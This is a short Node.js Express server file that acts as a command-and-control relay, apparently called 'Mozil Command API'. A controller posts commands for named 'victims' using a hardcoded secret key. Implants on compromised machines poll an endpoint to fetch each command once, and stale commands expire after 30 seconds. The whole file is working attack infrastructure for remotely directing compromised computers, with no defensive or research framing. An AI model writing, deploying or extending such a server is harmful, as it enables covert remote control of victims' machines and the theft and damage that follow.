// server.js
const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

const COMMAND_KEY = 'moziu-super-secret';
const commandQueue = new Map(); // victim -> command

// Health check
app.get('/', (req, res) => {
    res.json({ status: 'Mozil Command API Running' });
});

// Controller sends command
app.post('/api/send-command', (req, res) => {
    const { victim, key, command, timestamp } = req.body;
    
    if (key !== COMMAND_KEY) {
        return res.status(403).json({ error: 'Invalid key' });
    }
    
    if (!victim || !command) {
        return res.status(400).json({ error: 'Missing victim or command' });
    }
    
    // Store command for victim to poll
    commandQueue.set(victim.toLowerCase(), {
        command,
        timestamp,
        received: Date.now()
    });
    
    console.log(`[CMD] ${victim}: ${command}`);
    res.json({ ok: true, queued: true });
});

// Victim polls for commands
app.get('/api/get-command', (req, res) => {
    const { user, key } = req.query;
    
    if (key !== COMMAND_KEY) {
        return res.status(403).json({ error: 'Invalid key' });
    }
    
    const victimKey = user.toLowerCase();
    const cmd = commandQueue.get(victimKey);
    
    if (cmd) {
        // Remove after sending (one-time command)
        commandQueue.delete(victimKey);
        return res.json({ ok: true, cmd: cmd.command, ts: cmd.timestamp });
    }
    
    res.json({ ok: true, cmd: null });
});

// Clear old commands (optional cleanup)
setInterval(() => {
    const now = Date.now();
    for (const [victim, data] of commandQueue) {
        if (now - data.received > 30000) { // 30s timeout
            commandQueue.delete(victim);
        }
    }
}, 10000);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
